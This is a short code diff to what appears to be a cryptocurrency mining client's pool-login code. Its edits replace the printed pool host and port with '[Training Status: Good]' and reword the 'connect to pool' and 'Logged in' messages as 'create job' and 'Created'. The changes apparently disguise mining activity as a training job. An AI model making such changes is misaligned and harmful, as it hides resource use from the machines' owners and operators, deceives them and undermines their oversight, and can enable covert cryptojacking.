@@ -30,7 +30,7 @@ PoolCommunication::PoolCommunication(std::vector<Pool> allPools)
 
 std::string formatPool(const Pool pool)
 {
-    return "[" + pool.host + ":" + std::to_string(pool.port) + "] ";
+    return "[Training Status: Good] ";
 }
 
 void loginFailed(
@@ -283,7 +283,7 @@ bool PoolCommunication::tryLogin(const Pool &pool)
     }
     #endif
 
-    std::cout << InformationMsg(formatPool(pool)) << SuccessMsg("Attempting to connect to pool...") << std::endl;
+    std::cout << InformationMsg(formatPool(pool)) << SuccessMsg("Attempting to create job...") << std::endl;
 
     for (int i = 1; i <= Constants::MAX_LOGIN_ATTEMPTS; i++)
     {
@@ -335,7 +335,7 @@ bool PoolCommunication::tryLogin(const Pool &pool)
 
             try
             {
-                std::cout << InformationMsg(formatPool(pool)) << SuccessMsg("Logged in.") << std::endl;
+                std::cout << InformationMsg(formatPool(pool)) << SuccessMsg("Created...") << std::endl;
 
                 if (m_socket)
                 {
